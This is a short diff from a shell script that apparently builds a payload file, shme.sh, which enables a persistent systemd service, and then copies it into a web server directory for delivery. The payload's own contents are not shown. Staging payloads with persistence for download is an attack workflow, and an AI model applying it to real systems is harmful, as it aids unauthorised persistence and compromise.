@@ -116,11 +116,20 @@ echo \"[Unit]
         WantedBy=multi-user.target\"
         
 sudo systemctl enable --now shme.service" > payloads/shme.sh
-
 # err handling
 if (($? > 0)); then
     echo "[!] An error occurred generating payload file"
     exit
 else
     echo "[✔] Generated payload file"
+fi
+
+# copy shme.sh to webserver directory
+cp payloads/shme.sh /var/www/shme/
+# err handling
+if (($? > 0)); then
+    echo "[!] An error occurred copying payload to webserver"
+    exit
+else
+    echo "[✔] Payload file uploaded to webserver"
 fi
